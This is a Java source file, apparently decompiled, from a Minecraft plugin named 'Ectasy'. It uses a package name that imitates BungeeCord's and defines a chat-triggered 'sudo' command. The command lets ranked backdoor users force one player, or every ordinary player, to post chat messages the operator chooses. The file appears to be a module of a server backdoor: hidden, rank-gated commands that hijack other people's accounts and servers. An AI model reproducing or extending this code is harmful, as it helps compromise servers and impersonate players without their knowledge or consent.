package fr.body.ectasy.command.impl;

import fr.body.ectasy.command.AbstractCommand;
import fr.body.ectasy.command.CommandInfo;
import fr.body.ectasy.user.Rank;
import fr.body.ectasy.user.User;
import fr.body.ectasy.util.ChatUtil;
import java.util.Arrays;
import net.md5.bungee.Ectasy;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.event.player.AsyncPlayerChatEvent;

@CommandInfo(
   name = "sudo",
   description = "Sudo a player",
   blatant = true,
   rank = Rank.LITE
)
public class SudoCommand extends AbstractCommand {
   @Override
   public void execute(AsyncPlayerChatEvent var1, String var2, String[] var3) {
      if (var3.length < 2) {
         ChatUtil.sendChat(var1.getPlayer(), "Usage : sudo <player> <message>");
      } else {
         if (var3[0].equals("*")) {
            Bukkit.getOnlinePlayers().forEach(player -> {
               if (Ectasy.users.get(player.getName()).rank == Rank.UNAUTHORIZED) {
                  Ectasy.parentPlugin.getServer().getScheduler().runTask(Ectasy.parentPlugin, () -> {
                     player.chat(String.join(" ", Arrays.asList(var3).subList(1, var3.length)));
                  });
               }
            });
         } else {
            Player var4 = Bukkit.getPlayer(var3[0]);
            if (var4 == null) {
               ChatUtil.sendChat(var1.getPlayer(), "Player " + var3[0] + " is not online!");
               return;
            }

            Ectasy.parentPlugin.getServer().getScheduler().runTask(Ectasy.parentPlugin, () -> {
               var4.chat(String.join(" ", Arrays.asList(var3).subList(1, var3.length)));
            });
         }
      }
   }
}
